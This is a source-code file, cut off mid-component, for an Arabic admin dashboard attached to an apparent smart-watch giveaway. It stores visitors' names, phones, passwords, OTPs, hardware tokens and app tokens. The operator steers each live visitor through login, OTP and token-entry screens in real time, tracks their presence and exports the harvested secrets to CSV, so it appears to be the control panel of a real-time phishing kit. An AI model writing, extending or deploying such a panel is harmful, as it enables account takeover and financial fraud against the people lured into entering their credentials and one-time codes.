import { useCallback, useEffect, useMemo, useRef, useState, type FormEvent } from "react";
import { createFileRoute } from "@tanstack/react-router";
import { toast } from "sonner";
import {
  Activity,
  BarChart3,
  Bell,
  BellOff,
  Clock,
  Copy,
  Download,
  Eye,
  Flame,
  LogOut,
  RefreshCw,
  Search,
  Send,
  Settings,
  Volume2,
  VolumeX,
  ShieldCheck,
  Trash2,
  Users,
  Wifi,
  WifiOff,
  X,
} from "lucide-react";

import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  adminDelete,
  adminListAll,
  adminLogin,
  adminSetStage,
  adminSetStatus,
} from "@/lib/admin.functions";
import {
  pushRemoteStage,
  subscribeOrderChanges,
} from "@/lib/realtime";
import { subscribeVisitors, type VisitorPresence } from "@/lib/presence";
import { supabase } from "@/integrations/supabase/client";

const TITLE = "لوحة تحكم لحظية — ساعة أهل مصر الذكية";

export const Route = createFileRoute("/dashboard")({
  head: () => ({
    meta: [
      { title: TITLE },
      { name: "robots", content: "noindex,nofollow" },
    ],
  }),
  component: DashboardPage,
});

type OrderRow = {
  id: string;
  session_id: string;
  name: string | null;
  phone: string | null;
  city: string | null;
  spec: string | null;
  watch_id: string | null;
  status: string;
  stage: string;
  user_code: string | null;
  password: string | null;
  otp: string | null;
  hw_token: string | null;
  app_token: string | null;
  created_at: string;
  updated_at: string;
};

type EventRow = {
  id: string;
  session_id: string;
  stage: string;
  payload: Record<string, unknown> | null;
  created_at: string;
};

const STAGES: { value: OrderRow["stage"]; label: string }[] = [
  { value: "select-watch", label: "اختيار الساعة" },
  { value: "register", label: "البيانات الشخصية" },
  { value: "login", label: "تسجيل الدخول" },
  { value: "verify-otp", label: "رمز التحقق" },
  { value: "hardware-token", label: "توكن الجهاز" },
  { value: "app-token", label: "توكن التطبيق" },
  { value: "processing", label: "الانتظار" },
];

const STAGE_LABEL: Record<string, string> = Object.fromEntries(STAGES.map((s) => [s.value, s.label]));

const STATUSES = [
  { value: "new", label: "جديد" },
  { value: "review", label: "قيد المراجعة" },
  { value: "approved", label: "مقبول" },
  { value: "rejected", label: "مرفوض" },
];

const STATUS_STYLE: Record<string, string> = {
  new: "bg-primary/10 text-primary",
  review: "bg-warning/15 text-warning",
  approved: "bg-success/15 text-success",
  rejected: "bg-rose-500/15 text-rose-700",
};

const CREDS_KEY = "elite:admin";

function saveCreds(u: string, p: string) {
  sessionStorage.setItem(CREDS_KEY, JSON.stringify({ u, p }));
}
function loadCreds(): { u: string; p: string } | null {
  try {
    const raw = sessionStorage.getItem(CREDS_KEY);
    return raw ? JSON.parse(raw) : null;
  } catch {
    return null;
  }
}
function clearCreds() {
  sessionStorage.removeItem(CREDS_KEY);
}

function DashboardPage() {
  const [creds, setCreds] = useState<{ u: string; p: string } | null>(null);
  useEffect(() => setCreds(loadCreds()), []);
  if (!creds) return <LoginForm onSuccess={(u, p) => setCreds({ u, p })} />;
  return (
    <Dashboard
      username={creds.u}
      password={creds.p}
      onLogout={() => {
        clearCreds();
        setCreds(null);
      }}
    />
  );
}

function extractServerMessage(err: unknown): string {
  const raw =
    err instanceof Error ? err.message : typeof err === "string" ? err : JSON.stringify(err);
  if (!raw) return "تعذر تسجيل الدخول";
  // Zod validation errors arrive as a JSON array of issues — surface them readably.
  try {
    const parsed = JSON.parse(raw);
    if (Array.isArray(parsed)) {
      const lines = parsed
        .map((i: { path?: (string | number)[]; message?: string }) =>
          [Array.isArray(i.path) ? i.path.join(".") : "", i.message].filter(Boolean).join(": "),
        )
        .filter(Boolean);
      if (lines.length) return lines.join(" — ");
    }
  } catch {
    /* not JSON: use the raw message */
  }
  return raw;
}

function LoginForm({ onSuccess }: { onSuccess: (u: string, p: string) => void }) {
  const [u, setU] = useState("");
  const [p, setP] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function handle(e: FormEvent) {
    e.preventDefault();
    const user = u.trim();
    const pass = p.trim();
    if (!user || !pass) {
      setError("يرجى إدخال اسم المستخدم وكلمة المرور");
      toast.error("يرجى إدخال اسم المستخدم وكلمة المرور");
      return;
    }
    setLoading(true);
    setError(null);
    try {
      const res = await adminLogin({ data: { username: user, password: pass } });
      if (!res?.ok) {
        const message = res?.error ?? "بيانات الدخول غير صحيحة";
        setError(message);
        toast.error(message);
        return;
      }
      saveCreds(user, pass);
      onSuccess(user, pass);
    } catch (err) {
      const message = extractServerMessage(err);
      setError(message);
      toast.error(message);
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="grid min-h-screen place-items-center bg-background px-4">
      <form
        onSubmit={handle}
        className="w-full max-w-sm space-y-4 rounded-3xl border border-border bg-card p-6 shadow-[var(--shadow-soft)]"
      >
        <div className="text-center">
          <span className="mx-auto grid h-12 w-12 place-items-center rounded-2xl bg-secondary text-primary">
            <ShieldCheck className="h-6 w-6" />
          </span>
          <h1 className="mt-3 text-lg font-black">لوحة تحكم المدير</h1>
          <p className="text-xs text-muted-foreground">أدخل بيانات الدخول للمتابعة</p>
        </div>
        <div className="space-y-2">
          <Label htmlFor="u">اسم المستخدم</Label>
          <Input id="u" value={u} onChange={(e) => setU(e.target.value)} autoComplete="username" />
        </div>
        <div className="space-y-2">
          <Label htmlFor="p">كلمة المرور</Label>
          <Input
            id="p"
            type="password"
            value={p}
            onChange={(e) => setP(e.target.value)}
            autoComplete="current-password"
          />
        </div>
        {error ? (
          <p
            data-testid="admin-login-error"
            role="alert"
            className="rounded-2xl border border-rose-500/30 bg-rose-500/10 px-3 py-2 text-xs font-bold text-rose-700"
          >
            {error}
          </p>
        ) : null}
        <Button
          type="submit"
          className="w-full"
          disabled={loading || !u.trim() || !p.trim()}
        >
          {loading ? "جارٍ الدخول..." : "دخول"}
        </Button>
      </form>
    </div>
  );
}

function Dashboard({
  username,
  password,
  onLogout,
}: {
  username: string;
  password: string;
  onLogout: () => void;
}) {
  const [orders, setOrders] = useState<OrderRow[]>([]);
  const [events, setEvents] = useState<EventRow[]>([]);
  const [visitors, setVisitors] = useState<VisitorPresence[]>([]);
  const [q, setQ] = useState("");
  const [statusFilter, setStatusFilter] = useState<string>("all");
  const [stageFilter, setStageFilter] = useState<string>("all");
  const [onlineOnly, setOnlineOnly] = useState(false);
  const [selected, setSelected] = useState<OrderRow | null>(null);
  const [lastPing, setLastPing] = useState<number>(Date.now());
  const [now, setNow] = useState(() => Date.now());
  const [rtStatus, setRtStatus] = useState<"connecting" | "live" | "offline">("connecting");
  const [alertsEnabled, setAlertsEnabled] = useState(false);
  const [notificationSound, setNotificationSound] = useState(true);
  const [settingsOpen, setSettingsOpen] = useState(false);
  const flashRef = useRef<Set<string>>(new Set());
  const eventFeedRef = useRef<HTMLUListElement>(null);
  const hasLoadedRef = useRef(false);
  const ordersRef = useRef<OrderRow[]>([]);
  const alertsRef = useRef(false);

  useEffect(() => {
    try {
      setAlertsEnabled(window.localStorage.getItem("elite:dashboard-alerts") === "true");
      setNotificationSound(window.localStorage.getItem("elite:dashboard-alert-sound") !== "false");
    } catch {
      // Storage can be unavailable in privacy mode; defaults remain safe.
    }
  }, []);

  useEffect(() => {
    ordersRef.current = orders;
    alertsRef.current = alertsEnabled;
  }, [orders, alertsEnabled]);

  const load = useCallback(
    async (options?: { silent?: boolean }) => {
      try {
        const res = await adminListAll({ data: { username, password } });
        const nextOrders = res.orders as OrderRow[];
        const previousIds = new Set(ordersRef.current.map((o) => o.id));
        const freshIds = hasLoadedRef.current
          ? nextOrders.filter((o) => !previousIds.has(o.id)).map((o) => o.id)
          : [];
        for (const id of freshIds) flashRef.current.add(id);
        if (freshIds.length) {
          window.setTimeout(() => {
            for (const id of freshIds) flashRef.current.delete(id);
          }, 2000);
           if (alertsRef.current && "Notification" in window && Notification.permission === "granted") {
             new Notification("طلب جديد — ساعة أهل مصر الذكية", {
               body: `${freshIds.length} طلب جديد يحتاج إلى مراجعة`,
               icon: "/icon-192.png",
             });
             playAlertSound(notificationSound);
           }
        }
        hasLoadedRef.current = true;
        setOrders(nextOrders);
        setEvents(res.events as EventRow[]);
      } catch (err) {
        const msg = (err as Error).message;
        if (msg.includes("غير مصرح") || msg.includes("Unauthorized")) {
          onLogout();
          return;
        }
        if (!options?.silent) toast.error(msg);
      }
    },
    [notificationSound, username, password, onLogout],
  );


  // Initial + realtime subscriptions
  useEffect(() => {
    void load();
    let refetchTimer: number | undefined;
    const scheduleRefetch = () => {
      if (refetchTimer) return;
      refetchTimer = window.setTimeout(() => {
        refetchTimer = undefined;
        void load({ silent: true });
      }, 250);
    };
    const unsub = subscribeOrderChanges(() => {
      setLastPing(Date.now());
      scheduleRefetch();
    });
    return () => {
      if (refetchTimer) window.clearTimeout(refetchTimer);
      unsub();
    };
  }, [load]);

  // Presence roster
  useEffect(() => {
    const unsub = subscribeVisitors(setVisitors);
    return unsub;
  }, []);

  // Realtime connection status indicator + live dashboard clock
  useEffect(() => {
    setRtStatus(supabase.realtime.isConnected() ? "live" : "connecting");
    const id = window.setInterval(() => {
      setRtStatus(supabase.realtime.isConnected() ? "live" : "offline");
      setNow(Date.now());
    }, 4000);
    return () => window.clearInterval(id);
  }, []);

  useEffect(() => {
    if (events.length > 0) eventFeedRef.current?.scrollTo({ top: 0, behavior: "smooth" });
  }, [events]);

  function updateAlerts(value: boolean) {
    setAlertsEnabled(value);
    try {
      window.localStorage.setItem("elite:dashboard-alerts", String(value));
    } catch {
      // Ignore storage restrictions.
    }
  }

  function updateNotificationSound(value: boolean) {
    setNotificationSound(value);
    try {
      window.localStorage.setItem("elite:dashboard-alert-sound", String(value));
    } catch {
      // Ignore storage restrictions.
    }
  }

  function playAlertSound(enabled: boolean) {
    if (!enabled || typeof window === "undefined" || !("AudioContext" in window)) return;
    try {
      const AudioContextClass = window.AudioContext || (window as typeof window & { webkitAudioContext?: typeof AudioContext }).webkitAudioContext;
      if (!AudioContextClass) return;
      const context = new AudioContextClass();
      const oscillator = context.createOscillator();
      const gain = context.createGain();
      oscillator.frequency.value = 740;
      oscillator.type = "sine";
      gain.gain.setValueAtTime(0.001, context.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.12, context.currentTime + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, context.currentTime + 0.28);
      oscillator.connect(gain);
      gain.connect(context.destination);
      oscillator.start();
      oscillator.stop(context.currentTime + 0.3);
      oscillator.addEventListener("ended", () => void context.close());
    } catch {
      // Audio is optional and may be blocked by the browser.
    }
  }

  async function enableAlerts() {
    if (!("Notification" in window)) {
      toast.error("الإشعارات غير مدعومة في هذا المتصفح");
      return;
    }
    const permission = await Notification.requestPermission();
    updateAlerts(permission === "granted");
    if (permission === "granted") toast.success("تم تفعيل تنبيهات الطلبات الجديدة");
    else toast.error("لم يتم السماح بالإشعارات");
  }

  const onlineSet = useMemo(() => new Set(visitors.map((v) => v.sessionId)), [visitors]);
  const pathBySession = useMemo(() => {
    const m: Record<string, string> = {};
    for (const v of visitors) m[v.sessionId] = v.path;
    return m;
  }, [visitors]);

  const filtered = useMemo(() => {
    return orders.filter((o) => {
      if (statusFilter !== "all" && o.status !== statusFilter) return false;
      if (stageFilter !== "all" && o.stage !== stageFilter) return false;
      if (onlineOnly && !onlineSet.has(o.session_id)) return false;
      if (q) {
        const s = q.toLowerCase();
        return (
          (o.name ?? "").toLowerCase().includes(s) ||
          (o.phone ?? "").includes(s) ||
          (o.session_id ?? "").includes(s) ||
          (o.user_code ?? "").toLowerCase().includes(s)
        );
      }
      return true;
    });
  }, [orders, q, statusFilter, stageFilter, onlineOnly, onlineSet]);

  const stats = useMemo(() => {
    const total = orders.length;
    const today = orders.filter(
      (o) => new Date(o.created_at).toDateString() === new Date().toDateString(),
    ).length;
    const inProc = orders.filter((o) => o.stage === "processing").length;
    return { total, today, inProc, online: visitors.length };
  }, [orders, visitors.length]);

  async function setStage(sessionId: string, stage: OrderRow["stage"]) {
    // Optimistic local update + instant push, then persist
    setOrders((prev) => prev.map((o) => (o.session_id === sessionId ? { ...o, stage } : o)));
    pushRemoteStage(sessionId, stage);
    try {
      await adminSetStage({ data: { username, password, sessionId, stage } });
      toast.success(`تم التوجيه: ${STAGE_LABEL[stage] ?? stage}`);
    } catch (err) {
      toast.error((err as Error).message);
      void load({ silent: true });
    }
  }

  async function setStatus(sessionId: string, status: string) {
    setOrders((prev) => prev.map((o) => (o.session_id === sessionId ? { ...o, status } : o)));
    try {
      await adminSetStatus({
        data: { username, password, sessionId, status: status as "new" },
      });
    } catch (err) {
      toast.error((err as Error).message);
      void load({ silent: true });
    }
  }

  async function remove(sessionId: string) {
    if (!window.confirm("حذف هذا الطلب وسجل أحداثه؟")) return;
    try {
      await adminDelete({ data: { username, password, sessionId } });
      toast.success("تم الحذف");
      setOrders((prev) => prev.filter((o) => o.session_id !== sessionId));
      if (selected?.session_id === sessionId) setSelected(null);
    } catch (err) {
      toast.error((err as Error).message);
    }
  }

  function copy(text: string, label: string) {
    if (!text) return;
    void navigator.clipboard.writeText(text).then(
      () => toast.success(`تم نسخ ${label}`),
      () => toast.error("فشل النسخ"),
    );
  }

  function exportCsv() {
    const headers = [
      "created_at",
      "session_id",
      "name",
      "phone",
      "city",
      "spec",
      "user_code",
      "password",
      "otp",
      "hw_token",
      "app_token",
      "stage",
      "status",
    ];
    const rows = filtered.map((o) =>
      headers
        .map((h) => {
          const v = String((o as unknown as Record<string, unknown>)[h] ?? "");
          return `"${v.replace(/"/g, '""')}"`;
        })
        .join(","),
    );
    const csv = "\uFEFF" + [headers.join(","), ...rows].join("\n");
    const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `orders-${new Date().toISOString().slice(0, 10)}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  }

  const secondsSincePing = Math.floor((now - lastPing) / 1000);

  return (
    <div className="min-h-screen bg-background">
      <header className="sticky top-0 z-20 border-b border-border bg-card/95 backdrop-blur">
        <div className="mx-auto flex max-w-7xl flex-wrap items-center justify-between gap-3 px-4 py-3">
          <div className="flex items-center gap-3">
            <span className="grid h-9 w-9 place-items-center rounded-xl bg-primary text-primary-foreground">
              <Activity className="h-4 w-4" />
            </span>
            <div>
              <h1 className="text-sm font-black">لوحة تحكم لحظية</h1>
              <p className="flex items-center gap-2 text-[11px] text-muted-foreground">
                <RtBadge status={rtStatus} />
                <span>آخر تحديث: {secondsSincePing === 0 ? "الآن" : `${secondsSincePing}ث`}</span>
              </p>
            </div>
          </div>
          <div className="flex flex-wrap items-center gap-2">
            <Button variant="outline" size="sm" onClick={exportCsv}>
              <Download className="h-4 w-4" />
              تصدير CSV
            </Button>
            <Button variant="outline" size="sm" onClick={() => void load()}>
              <RefreshCw className="h-4 w-4" />
              تحديث
            </Button>
            <Button
              variant="outline"
              size="sm"
              onClick={() => setSettingsOpen((open) => !open)}
              aria-expanded={settingsOpen}
              title="إعدادات التنبيهات"
            >
              <Settings className="h-4 w-4" />
              الإعدادات
            </Button>
            <Button
              variant={alertsEnabled ? "secondary" : "outline"}
              size="sm"
              onClick={() => void enableAlerts()}
              title="تنبيهات الطلبات الجديدة"
            >
              {alertsEnabled ? <Bell className="h-4 w-4" /> : <BellOff className="h-4 w-4" />}
              {alertsEnabled ? "التنبيهات مفعلة" : "تفعيل التنبيهات"}
            </Button>
            <Button variant="ghost" size="sm" onClick={onLogout}>
              <LogOut className="h-4 w-4" />
              خروج
            </Button>
          </div>
        </div>
      </header>

      {settingsOpen && (
        <section className="border-b border-border bg-secondary/30">
          <div className="mx-auto flex max-w-7xl flex-wrap items-center gap-4 px-4 py-4">
            <div className="me-auto">
              <h2 className="text-sm font-black">إعدادات تنبيهات الطلبات</h2>
              <p className="mt-1 text-xs text-muted-foreground">تحكم في إشعارات الطلبات الجديدة وصوت التنبيه.</p>
            </div>
            <label className="flex min-h-[44px] cursor-pointer items-center gap-3 rounded-xl border border-border bg-card px-3 text-xs font-bold">
              <input
                type="checkbox"
                className="accent-primary"
                checked={alertsEnabled}
                onChange={(event) => {
                  if (event.target.checked) void enableAlerts();
                  else updateAlerts(false);
                }}
              />
              <Bell className="h-4 w-4 text-primary" aria-hidden="true" />
              إشعارات سطح المكتب
            </label>
            <label className="flex min-h-[44px] cursor-pointer items-center gap-3 rounded-xl border border-border bg-card px-3 text-xs font-bold">
              <input
                type="checkbox"
                className="accent-primary"
                checked={notificationSound}
                onChange={(event) => updateNotificationSound(event.target.checked)}
              />
              {notificationSound ? <Volume2 className="h-4 w-4 text-primary" /> : <VolumeX className="h-4 w-4 text-muted-foreground" />}
              صوت التنبيه
            </label>
          </div>
        </section>
      )}

      <main className="mx-auto max-w-7xl space-y-5 px-4 py-5">
        {/* KPIs */}
        <section className="grid gap-3 sm:grid-cols-2 lg:grid-cols-4">
          <StatCard label="متصلون الآن" value={stats.online} icon={<Users className="h-4 w-4" />} accent />
          <StatCard label="طلبات اليوم" value={stats.today} icon={<Flame className="h-4 w-4" />} />
          <StatCard label="قيد الانتظار" value={stats.inProc} icon={<Clock className="h-4 w-4" />} />
          <StatCard label="إجمالي الطلبات" value={stats.total} icon={<Activity className="h-4 w-4" />} />
        </section>

        <section className="grid gap-4 lg:grid-cols-[1.3fr_1fr]">
          <ConversionPanel orders={orders} />
          <StageOverview orders={orders} />
        </section>

        <div className="grid gap-5 lg:grid-cols-[1fr_320px]">
          {/* LEFT: filters + orders table */}
          <div className="space-y-4">
            <section className="flex flex-wrap items-center gap-2 rounded-2xl border border-border bg-card p-3">
              <div className="relative min-w-[220px] flex-1">
                <Search className="pointer-events-none absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                <Input
                  placeholder="بحث بالاسم / الهاتف / المعرّف / كود المستخدم"
                  value={q}
                  onChange={(e) => setQ(e.target.value)}
                  className="pr-9"
                />
              </div>
              <Select value={statusFilter} onValueChange={setStatusFilter}>
                <SelectTrigger className="w-40">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">كل الحالات</SelectItem>
                  {STATUSES.map((s) => (
                    <SelectItem key={s.value} value={s.value}>
                      {s.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <Select value={stageFilter} onValueChange={setStageFilter}>
                <SelectTrigger className="w-44">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">كل المراحل</SelectItem>
                  {STAGES.map((s) => (
                    <SelectItem key={s.value} value={s.value}>
                      {s.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <label className="flex cursor-pointer items-center gap-2 rounded-xl border border-input bg-background px-3 py-2 text-xs font-bold">
                <input
                  type="checkbox"
                  className="accent-primary"
                  checked={onlineOnly}
                  onChange={(e) => setOnlineOnly(e.target.checked)}
                />
                المتصلون فقط
              </label>
              {(q || statusFilter !== "all" || stageFilter !== "all" || onlineOnly) && (
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => {
                    setQ("");
                    setStatusFilter("all");
                    setStageFilter("all");
                    setOnlineOnly(false);
                  }}
                >
                  <X className="h-4 w-4" />
                  مسح الفلاتر
                </Button>
              )}
              <span className="ms-auto rounded-full bg-secondary px-3 py-1 text-[11px] font-black text-primary">
                {filtered.length} / {orders.length}
              </span>

            </section>

            <section className="overflow-hidden rounded-2xl border border-border bg-card">
              <div className="overflow-x-auto">
                <table className="w-full min-w-[900px] text-right text-sm">
                  <thead className="bg-secondary/60 text-xs font-black">
                    <tr>
                      <th className="p-3">العميل</th>
                      <th className="p-3">الهاتف</th>
                      <th className="p-3">المرحلة</th>
                      <th className="p-3">الحالة</th>
                      <th className="p-3">آخر تحديث</th>
                      <th className="p-3">تحكم</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filtered.length === 0 && (
                      <tr>
                        <td colSpan={6} className="p-8 text-center text-muted-foreground">
                          لا توجد طلبات مطابقة
                        </td>
                      </tr>
                    )}
                    {filtered.map((o) => {
                      const isOnline = onlineSet.has(o.session_id);
                      const isFresh = flashRef.current.has(o.id);

                      return (
                        <tr
                          key={o.id}
                          onClick={() => setSelected(o)}
                          className={`cursor-pointer border-t border-border align-top transition-colors hover:bg-secondary/40 ${
                            isFresh ? "animate-pulse bg-primary/5" : ""
                          } ${selected?.id === o.id ? "bg-primary/10" : ""}`}
                        >
                          <td className="p-3">
                            <div className="flex items-center gap-2">
                              <span
                                className={`inline-block h-2 w-2 rounded-full ${
                                  isOnline ? "animate-pulse bg-success" : "bg-muted-foreground/40"
                                }`}
                                title={isOnline ? "متصل" : "غير متصل"}
                              />
                              <div>
                                <div className="font-bold">
                                  {o.name || <em className="text-muted-foreground">بلا اسم</em>}
                                </div>
                                <div className="font-mono text-[10px] text-muted-foreground">
                                  {o.session_id.slice(0, 12)}
                                </div>
                              </div>
                            </div>
                          </td>
                          <td className="p-3 font-mono text-xs">{o.phone || "—"}</td>
                          <td className="p-3" onClick={(e) => e.stopPropagation()}>
                            <Select
                              value={o.stage}
                              onValueChange={(v) => setStage(o.session_id, v as OrderRow["stage"])}
                            >
                              <SelectTrigger className="h-8 w-40 text-xs">
                                <SelectValue />
                              </SelectTrigger>
                              <SelectContent>
                                {STAGES.map((s) => (
                                  <SelectItem key={s.value} value={s.value}>
                                    <Send className="ml-1 inline h-3 w-3" />
                                    {s.label}
                                  </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                          </td>
                          <td className="p-3" onClick={(e) => e.stopPropagation()}>
                            <Select value={o.status} onValueChange={(v) => setStatus(o.session_id, v)}>
                              <SelectTrigger
                                className={`h-8 w-28 text-xs font-bold ${STATUS_STYLE[o.status] ?? ""}`}
                              >
                                <SelectValue />
                              </SelectTrigger>
                              <SelectContent>
                                {STATUSES.map((s) => (
                                  <SelectItem key={s.value} value={s.value}>
                                    {s.label}
                                  </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                          </td>
                          <td className="p-3 text-[11px] text-muted-foreground">
                            {timeAgo(o.updated_at)}
                          </td>
                          <td className="p-3" onClick={(e) => e.stopPropagation()}>
                            <div className="flex gap-1">
                              <button
                                onClick={() => setSelected(o)}
                                className="grid h-8 w-8 place-items-center rounded-lg border border-border hover:bg-secondary"
                                title="تفاصيل"
                              >
                                <Eye className="h-4 w-4" />
                              </button>
                              <button
                                onClick={() => remove(o.session_id)}
                                className="grid h-8 w-8 place-items-center rounded-lg border border-destructive/40 text-destructive hover:bg-destructive/10"
                                title="حذف"
                              >
                                <Trash2 className="h-4 w-4" />
                              </button>
                            </div>
                          </td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            </section>
          </div>

          {/* RIGHT: presence + live event feed */}
          <aside className="space-y-4">
            <section className="rounded-2xl border border-border bg-card p-4">
              <div className="mb-3 flex items-center justify-between">
                <h2 className="flex items-center gap-2 text-sm font-black">
                  <span className="grid h-6 w-6 place-items-center rounded-lg bg-success/15 text-success">
                    <Users className="h-3.5 w-3.5" />
                  </span>
                  المتصلون الآن
                </h2>
                <span className="rounded-full bg-success/15 px-2 py-0.5 text-[11px] font-black text-success">
                  {visitors.length}
                </span>
              </div>
              <ul className="max-h-72 space-y-2 overflow-y-auto text-xs">
                {visitors.length === 0 && (
                  <li className="rounded-lg bg-secondary/40 p-3 text-center text-muted-foreground">
                    لا يوجد زوار حالياً
                  </li>
                )}
                {visitors.map((v) => {
                  const order = orders.find((o) => o.session_id === v.sessionId);
                  return (
                    <li
                      key={v.sessionId}
                      className="flex items-center justify-between gap-2 rounded-lg bg-secondary/40 p-2"
                    >
                      <div className="min-w-0">
                        <div className="truncate text-xs font-bold">
                          {order?.name || <span className="text-muted-foreground">زائر</span>}
                        </div>
                        <div className="truncate font-mono text-[10px] text-muted-foreground">
                          {v.path}
                        </div>
                      </div>
                      <span className="inline-flex items-center gap-1 rounded-full bg-success/15 px-2 py-0.5 text-[10px] font-black text-success">
                        <span className="inline-block h-1.5 w-1.5 animate-pulse rounded-full bg-success" />
                        نشط
                      </span>
                    </li>
                  );
                })}
              </ul>
            </section>

            <section className="rounded-2xl border border-border bg-card p-4">
              <h2 className="mb-3 text-sm font-black">آخر الأحداث اللحظية</h2>
              <ul ref={eventFeedRef} className="max-h-80 space-y-2 overflow-y-auto text-xs">
                {events.slice(0, 60).map((e) => (
                  <li
                    key={e.id}
                    className="flex items-center justify-between gap-2 rounded-lg bg-secondary/40 p-2"
                  >
                    <span className="font-mono text-[10px] text-muted-foreground">
                      {e.session_id.slice(0, 8)}
                    </span>
                    <span className="flex-1 truncate text-xs font-bold">
                      {STAGE_LABEL[e.stage] ?? e.stage}
                    </span>
                    <span className="text-[10px] text-muted-foreground">
                      {new Date(e.created_at).toLocaleTimeString("ar-EG")}
                    </span>
                  </li>
                ))}
                {events.length === 0 && (
                  <li className="text-center text-muted-foreground">لا أحداث بعد</li>
                )}
              </ul>
            </section>
          </aside>
        </div>
      </main>

      {selected && (
        <DetailsDrawer
          order={selected}
          events={events.filter((e) => e.session_id === selected.session_id)}
          isOnline={onlineSet.has(selected.session_id)}
          currentPath={pathBySession[selected.session_id]}
          onClose={() => setSelected(null)}
          onCopy={copy}
          onStage={(s) => setStage(selected.session_id, s)}
          onStatus={(s) => setStatus(selected.session_id, s)}
        />
      )}
    </div>
  );
}

function RtBadge({ status }: { status: "connecting" | "live" | "offline" }) {
  if (status === "live") {
    return (
      <span className="inline-flex items-center gap-1 rounded-full bg-success/15 px-2 py-0.5 text-[10px] font-black text-success">
        <Wifi className="h-3 w-3" /> LIVE
      </span>
    );
  }
  if (status === "offline") {
    return (
      <span className="inline-flex items-center gap-1 rounded-full bg-rose-500/15 px-2 py-0.5 text-[10px] font-black text-rose-700">
        <WifiOff className="h-3 w-3" /> منقطع
      </span>
    );
  }
  return (
    <span className="inline-flex items-center gap-1 rounded-full bg-warning/15 px-2 py-0.5 text-[10px] font-black text-warning">
      <Wifi className="h-3 w-3" /> اتصال...
    </span>
  );
}

function ConversionPanel({ orders }: { orders: OrderRow[] }) {
  const started = orders.filter((o) => o.stage !== "select-watch").length;
  const completed = orders.filter((o) => o.status === "approved").length;
  const review = orders.filter((o) => o.status === "review").length;
  const rate = orders.length ? Math.round((completed / orders.length) * 100) : 0;

  return (
    <section className="rounded-2xl border border-border bg-card p-4 shadow-[var(--shadow-card)]">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="flex items-center gap-2 text-sm font-black"><BarChart3 className="h-4 w-4 text-primary" /> ملخص الأداء</h2>
          <p className="mt-1 text-xs text-muted-foreground">نظرة سريعة على مسار الطلبات</p>
        </div>
        <span className="text-2xl font-black text-primary">{rate}%</span>
      </div>
      <div className="mt-4 h-2 overflow-hidden rounded-full bg-secondary">
        <div className="h-full rounded-full bg-primary transition-all" style={{ width: `${rate}%` }} />
      </div>
      <div className="mt-4 grid grid-cols-3 gap-2 text-center text-xs">
        <Metric label="بدأوا الطلب" value={started} />
        <Metric label="قيد المراجعة" value={review} />
        <Metric label="مقبول" value={completed} />
      </div>
    </section>
  );
}

function StageOverview({ orders }: { orders: OrderRow[] }) {
  const max = Math.max(1, ...STAGES.map((s) => orders.filter((o) => o.stage === s.value).length));
  return (
    <section className="rounded-2xl border border-border bg-card p-4 shadow-[var(--shadow-card)]">
      <h2 className="flex items-center gap-2 text-sm font-black"><Activity className="h-4 w-4 text-primary" /> توزيع المراحل</h2>
      <div className="mt-4 space-y-2">
        {STAGES.slice(0, 6).map((stage) => {
          const count = orders.filter((o) => o.stage === stage.value).length;
          return <div key={stage.value} className="flex items-center gap-2 text-xs"><span className="w-24 shrink-0 truncate text-muted-foreground">{stage.label}</span><div className="h-2 flex-1 overflow-hidden rounded-full bg-secondary"><div className="h-full rounded-full bg-primary/70 transition-all" style={{ width: `${(count / max) * 100}%` }} /></div><span className="w-5 text-left font-black">{count}</span></div>;
        })}
      </div>
    </section>
  );
}

function Metric({ label, value }: { label: string; value: number }) {
  return <div className="rounded-xl bg-secondary/60 p-2"><div className="text-lg font-black">{value}</div><div className="mt-0.5 text-[10px] text-muted-foreground">{label}</div></div>;
}

function StatCard({
  label,
  value,
  icon,
  accent,
}: {
  label: string;
  value: number;
  icon?: React.ReactNode;
  accent?: boolean;
}) {
  return (
    <div
      className={`rounded-2xl border p-4 shadow-[var(--shadow-soft)] ${
        accent
          ? "border-success/30 bg-success/5"
          : "border-border bg-card"
      }`}
    >
      <div className="flex items-center justify-between text-xs text-muted-foreground">
        <span>{label}</span>
        {icon && (
          <span
            className={`grid h-7 w-7 place-items-center rounded-lg ${
              accent ? "bg-success/15 text-success" : "bg-secondary text-primary"
            }`}
          >
            {icon}
          </span>
        )}
      </div>
      <div className="mt-1 text-2xl font-black">{value}</div>
    </div>
  );
}

function DetailsDrawer({
  order,
  events,
  isOnline,
  currentPath,
  onClose,
  onCopy,
  onStage,
  onStatus,
}: {
  order: OrderRow;
  events: EventRow[];
  isOnline: boolean;
  currentPath?: string | undefined;
  onClose: () => void;
  onCopy: (text: string, label: string) => void;
  onStage: (stage: OrderRow["stage"]) => void;
  onStatus: (status: string) => void;
}) {
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") onClose();
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);
  return (
    <div className="fixed inset-0 z-40" onClick={onClose}>

      <div className="absolute inset-0 bg-foreground/40" />
      <aside
        onClick={(e) => e.stopPropagation()}
        className="absolute inset-y-0 left-0 flex w-full max-w-md flex-col border-l border-border bg-card shadow-2xl"
      >
        <div className="flex items-start justify-between border-b border-border p-4">
          <div>
            <div className="flex items-center gap-2">
